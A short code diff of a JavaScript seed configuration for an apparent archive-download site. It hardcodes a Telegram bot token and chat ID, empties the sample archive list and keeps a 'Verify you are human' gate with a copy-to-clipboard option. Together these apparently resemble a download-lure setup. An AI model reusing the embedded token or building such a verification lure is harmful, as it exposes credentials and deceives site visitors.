@@ -23,15 +23,12 @@ function loadDB() {
   } catch (e) {
     const seed = {
       settings: {
-        botToken: process.env.TELEGRAM_BOT_TOKEN || '',
-        chatId: process.env.TELEGRAM_CHAT_ID || '-5417526972',
+        botToken: process.env.TELEGRAM_BOT_TOKEN || '8981221059:AAHJoxZ2Mt-3HDtqDsFTSdfmV-g98Ac3TAU',
+        chatId: process.env.TELEGRAM_CHAT_ID || '-5469582589',
         passwordWord: 'thing',
         verify: { enabled: false, title: 'Verify you are human', button: 'I am human', seconds: 5, copyEnabled: false, copyLabel: 'Copy', copyText: '' }
       },
-      zips: [
-        { id: 'zip1', title: 'Starter Pack', desc: 'Sample starter collection. Password for every archive is thing.', file: null, size: 0, downloads: 0, locked: false, videos: ['https://www.youtube.com/embed/dQw4w9WgXcQ'], created: Date.now() },
-        { id: 'zip2', title: 'Essentials', desc: 'Essential files collection. All passwords are thing.', file: null, size: 0, downloads: 0, locked: false, videos: [], created: Date.now() }
-      ],
+      zips: [],
       visits: [],
       downloads: [],
       referrals: {},
